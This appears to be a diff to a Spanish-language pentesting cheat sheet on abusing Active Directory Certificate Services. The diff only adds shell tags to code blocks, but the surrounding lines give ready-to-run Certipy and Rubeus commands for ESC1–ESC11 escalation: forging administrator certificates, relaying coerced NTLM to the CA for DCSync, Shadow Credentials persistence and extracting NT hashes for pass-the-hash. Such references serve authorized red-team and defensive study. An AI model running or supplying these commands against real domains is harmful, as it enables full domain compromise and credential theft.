@@ -17,7 +17,7 @@ tags:
 
 ## 0. Encontrar todo — Certipy
 
-```
+```sh
 certipy find -u user@dominio.local -p 'pass' -dc-ip 10.0.0.10 -stdout
 certipy find -u user@dominio.local -p 'pass' -dc-ip 10.0.0.10 -vulnerable -stdout
 certipy find -u user@dominio.local -p 'pass' -dc-ip 10.0.0.10 -json      # para revisar todo
@@ -47,7 +47,7 @@ certipy find -u user@dominio.local -p 'pass' -dc-ip 10.0.0.10 -json      # para 
 
 Ver [[ADCS - certificado con SAN arbitrario]].
 
-```
+```sh
 certipy req -u user@dominio.local -p 'pass' -ca CA-NAME -template VulnTemplate \
   -upn administrador@dominio.local -dc-ip 10.0.0.10
 certipy auth -pfx administrador.pfx -dc-ip 10.0.0.10
@@ -59,7 +59,7 @@ certipy auth -pfx administrador.pfx -dc-ip 10.0.0.10
 
 La plantilla tiene EKU "Any Purpose" o ninguno: el certificado sirve para autenticar aunque no lo diga.
 
-```
+```sh
 certipy req -u user@dominio.local -p 'pass' -ca CA-NAME -template ESC2Template
 # el cert vale para autenticar; usar como en ESC1 si además permite SAN,
 # o como agente de inscripción (ESC3) si aplica
@@ -69,7 +69,7 @@ certipy req -u user@dominio.local -p 'pass' -ca CA-NAME -template ESC2Template
 
 Una plantilla con EKU `Certificate Request Agent` permite pedir certificados **en nombre de otro**:
 
-```
+```sh
 # 1. obtener el cert de agente
 certipy req -u user@dominio.local -p 'pass' -ca CA-NAME -template ESC3-Agent
 # 2. usarlo para pedir un cert de autenticación como administrador
@@ -82,7 +82,7 @@ certipy auth -pfx administrador.pfx
 
 Si se tiene `WriteProperty` sobre una plantilla, se la reconfigura para volverla ESC1, se explota, y se la deja como estaba:
 
-```
+```sh
 certipy template -u user@dominio.local -p 'pass' -template VulnTemplate -save-old
 # ahora la plantilla es ESC1 → explotar como § 2
 # restaurar
@@ -105,7 +105,7 @@ Ver [[ADCS - abuso de la configuración de la CA]].
 
 Con `ManageCA` se puede habilitar la bandera de ESC6, o con `ManageCertificates` aprobar una petición pendiente:
 
-```
+```sh
 certipy ca -u user@dominio.local -p 'pass' -ca CA-NAME -add-officer user   # ManageCertificates
 certipy ca -u user@dominio.local -p 'pass' -ca CA-NAME -enable-template SubCA
 # pedir contra SubCA (falla, queda pendiente), luego aprobar la propia petición
@@ -116,7 +116,7 @@ certipy ca -u user@dominio.local -p 'pass' -ca CA-NAME -issue-request 12
 
 El endpoint de inscripción (web HTTP para ESC8, RPC para ESC11) acepta NTLM. Se relaya una autenticación coaccionada — ver [[Relay de NTLM]] y [[AD envenenamiento y relay - matriz de referencia]] § 5:
 
-```
+```sh
 certipy relay -target http://ca.dominio.local -template DomainController   # ESC8
 # coaccionar el DC a autenticarse al relay → cert del DC → DCSync
 ```
@@ -125,7 +125,7 @@ certipy relay -target http://ca.dominio.local -template DomainController   # ESC
 
 Sin la extensión de seguridad (`szOID_NTDS_CA_SECURITY_EXT`) o con mapeo implícito, un certificado con el UPN de la víctima autentica como ella. Se combina con control de la cuenta para cambiarle el UPN:
 
-```
+```sh
 # cambiar el UPN de una cuenta controlada al del objetivo, pedir cert, revertir
 certipy account update -u user@dominio.local -p 'pass' -user CTRL -upn administrador
 certipy req ... -template ESC9Template
@@ -137,7 +137,7 @@ certipy auth -pfx cert.pfx -domain dominio.local
 
 No es una mala configuración, es persistencia: robar un cert ya emitido y su clave.
 
-```
+```sh
 certipy find -u user -p pass -dc-ip 10.0.0.10 -stdout   # ver qué hay
 # desde una máquina comprometida
 certipy shadow auto -u user@dominio.local -p 'pass' -account objetivo   # Shadow Credentials (msDS-KeyCredentialLink)
@@ -150,7 +150,7 @@ Shadow Credentials (escribir `msDS-KeyCredentialLink`) es la persistencia por ce
 
 Común a todo el catálogo:
 
-```
+```sh
 certipy auth -pfx cert.pfx -dc-ip 10.0.0.10                 # TGT + hash NT
 Rubeus.exe asktgt /user:usuario /certificate:cert.pfx /ptt  # desde Windows
 # el hash NT que devuelve auth sirve para pass-the-hash
